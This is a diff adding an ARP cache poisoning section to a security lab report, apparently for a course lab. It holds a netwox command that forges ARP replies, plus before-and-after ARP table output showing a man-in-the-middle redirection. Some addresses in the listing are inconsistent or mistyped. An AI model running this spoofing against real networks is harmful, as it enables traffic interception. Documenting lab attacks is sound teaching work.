@@ -91,6 +91,31 @@ In each subtask we explain the cause of a vulnerability, show how to perform a p
 \end{center}
 
 \section{ARP cache poisoning}
+\begin{lstlisting}
+# Man in the middle example
+#
+# VICTIM
+# MAC: 08:00:27:A6:EB:87
+#   IP: IP: 192.168.0.102
+
+# Some other node
+#   MAC: 08:00:27:93:07:7e
+# IP: 192.168.0.103
+
+# ATTACKER (Man in the middle)
+# MAC: 08:00:27:ee:0d:0f
+#   IP: IP: 192.168.101
+sudo netwox 33 -b 08:00:27:A6:EB:87 -g 192.168.0.103 -h 08:00:27:A6:EB:86 -i 192.168.0.101
+
+
+# Before attack
+seed@victim: arp-a
+(192.168.0.103) at 08:00:27:93:07:7e
+
+# After attack
+seed@victim: arp-a
+(192.168.0.103) at 08:00:27:ee:0d:0f
+\end{lstlisting}
 
 \section{Conclusions}
 Attacks presented here show how a user can make harm to the system or gain \texttt{root} privileges by exploiting vulnerabilities in: \texttt{C} string formatting, \texttt{chroot} command/system call, and \texttt{C} buffer overflow.
